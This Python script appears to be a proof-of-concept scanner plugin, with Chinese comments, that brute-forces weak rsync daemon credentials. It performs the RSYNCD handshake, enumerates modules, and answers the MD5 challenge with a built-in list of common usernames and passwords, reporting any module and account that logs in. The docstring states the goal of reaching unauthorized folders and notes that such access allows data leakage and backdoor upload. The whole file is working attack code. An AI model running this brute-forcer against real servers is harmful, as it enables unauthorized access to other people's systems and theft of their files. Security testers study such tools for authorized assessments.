#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''rsync弱口令扫描.
rsync存在弱密码. PoC将在msg里输出 【未授权访问的文件夹、账号、密码】。 rsync未授权访问带来的危害主要有两个：一是造成了严重的信息泄露；二是上传脚本后门文件，远程命令执行。
'''

# 版权信息
__author__ = "cdxy https://github.com/Xyntax"
__reference__ = "https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/rsync-weakpass.py"
__modifiedby__ = "unc1e"


import socket
import struct
import hashlib
import base64
import signal

# 账号密码
USER_LIST = ['root', 'Administrator', 'rsync', 'user', 'test']
PASS_LIST = ['', 'password', '123456', '12345678', 'qwerty', 'admin123', 'test123', '123456789']
# USER_LIST = ['root']

def initialisation(ip, port):
    '''
        初始化并获得版本信息,每次会话前都要发送版本信息
    '''
    try:
        flag = False
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(8)
        rsync = {"MagicHeader": "@RSYNCD:", "HeaderVersion": " 30.0"}
        payload = struct.pack("!8s5ss", rsync["MagicHeader"].encode("utf-8"), rsync["HeaderVersion"].encode("utf-8"), "\n".encode("utf-8"))  # init
        port = int(port)
        s.connect((ip, port))
        s.send(payload)
        data = s.recv(1024)
        # reply = struct.unpack('!8s5ss', data)
        reply = data.decode()
        if ("RSYNCD" in reply):
            flag = True
            version = reply.split(' ')[1].strip()#31.0 
            rsynclist = ClientQuery(s)  # 查询模块名

        if flag:
            return True, "@RSYNCD:", version, rsynclist
    except Exception as e:
        print('[-]rsync weakpass not found (brute failed)(%s)' % str(e))



def ClientQuery(socket_pre):
    '''
        查询所有的模块名
        @return module name
    '''
    s = socket_pre
    payload = struct.pack("!s", "\n".encode('utf-8'))  # query
    modulelist = []
    try:

        s.send(payload)
        while True:
            data = s.recv(1024)  # Module List lenth 17
            moduletemp = struct.unpack("!" + str(len(data)) + "s", data)
            modulename = moduletemp[0].decode().replace(" ", "").split("\n")
            for i in range(len(modulename)):
                realname = modulename[i].split("\t")
                if realname[0] != "":
                    modulelist.append(realname[0])
            if modulename[-2] == "@RSYNCD:EXIT":
                break
    except Exception as e:
        print(e)
        s.close()
    s.close()
    return modulelist


def ClientCommand(ip, port, cmd):
    '''爆破密码的封装方法
    '''
    rsync = {"MagicHeader": "@RSYNCD:", "HeaderVersion": " 30.0"}
    payload1 = struct.pack("!8s5ss", rsync["MagicHeader"].encode("utf-8"), rsync["HeaderVersion"].encode("utf-8"), "\n".encode("utf-8"))
    # payload2 = struct.pack("!%ss" % (len(cmd)+1), cmd.encode("utf-8")+'\n'.encode("utf-8") )
    payload2 = cmd.encode("utf-8")+'\n'.encode("utf-8") 

    pass_list = []
    for i in USER_LIST:
        pass_list.append((i, i))
        for j in PASS_LIST:
            pass_list.append((i, j))

    for useri, pwdj in pass_list:
        try:
            user = useri.encode("utf-8")
            password = pwdj.encode("utf-8")
            # debug("try: %s,%s" %(useri,pwdj))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port = int(port)
            s.connect((ip, port))
            # step1 get version and init
            s.send(payload1)
            s.recv(1024)  # data  @RSYNCD: AUTHREQD 9moobOy1VMjNAU/D4PB35g
            # send cmd and generate the challenge code
            s.send(payload2)  # send client query
            data = s.recv(1024)  # data  @RSYNCD: AUTHREQD 9moobOy1VMjNAU/D4PB35g
            challenge = data[18:-1]  # get challenge code
            # encrypt and generate the payload3
            md = hashlib.md5()
            md.update(password)
            md.update(challenge)
            auth_send_data = base64.encodestring(md.digest())
            payload3 = "%s %s\n" % (user.decode(), auth_send_data[:-3].decode())
            payload3 = payload3.encode()
            s.send(payload3)
            data3 = s.recv(1024)  # @RSYNCD: OK
            s.close()
            if 'OK' in data3.decode():
                state = 1
                if password == '':
                    msg = "Module:'%s' User/Password:%s/<empty>" % (cmd, user)
                else:
                    msg = "Module:'%s' User/Password:%s/%s" % (cmd, user, password)

                return state, msg 
            else:
                continue
        # try next user-pwd pair            
        except Exception as e:
            # print('[-]rsync weakpass not found (brute failed)(%s)' % str(e))
            s.close()
            break
    state = 0
    msg = '[-]rsync weakpass not found (brute failed)'
    return state, msg 


def run(args):
    msg = ''
    state = 0
    # param init
    try:
        ip = args.get('ip')
        port = args.get("port", '873')
    except Exception as e:
        state = 0
        msg = '[-]parse ip/port error(%s)' % str(e)
        result = {'ip': ip, 'port': port, 'state': state, 'msg': msg}
        return result      

    try:
        res = initialisation(ip, port)
        # (True, '@RSYNCD:', ' 31.0', ['share', '@RSYNCD:EXIT'])
        if res[0]:
            if res[2] < "30.0":  # 判断版本, 不兼容<30.0版本的登录方式
                state = 0
                msg = '[-]version not support'
                result = {'ip': ip, 'port': port, 'state': state, 'msg': msg}
                return result    

            for i in range(len(res[3]) - 1):
                state, msg = ClientCommand(ip, port, res[3][i])
                if 'Module:' in msg:
                    msg += msg
                else:
                    msg = "[-]No Module Available"
            
            result = {'ip': ip, 'port': port, 'state': state, 'msg': msg}
            return result
        else:
            state = 0
            msg = '[-]version not support'
            result = {'ip': ip, 'port': port, 'state': state, 'msg': msg}
            return result    

    except Exception as e:
        state = 0
        msg = '[-]vuln not found, error:(%s)' % str(e)
        result = {'ip': ip, 'port': port, 'state': state, 'msg': msg}
        return result       


if __name__ == '__main__':
    '''在这里填写爆破的目标信息
    '''

    ip = '127.0.0.1'
    port = '873'
    args = {'ip': ip, 'port': port}
    res = run(args)
    print(res)
    # {'ip': '127.0.0.1', 'port': '873', 'state': 1, 'msg': "Module:'Config' User/Password:b'rsync'/b'123456'Module:'Config' User/Password:b'rsync'/b'123456'"}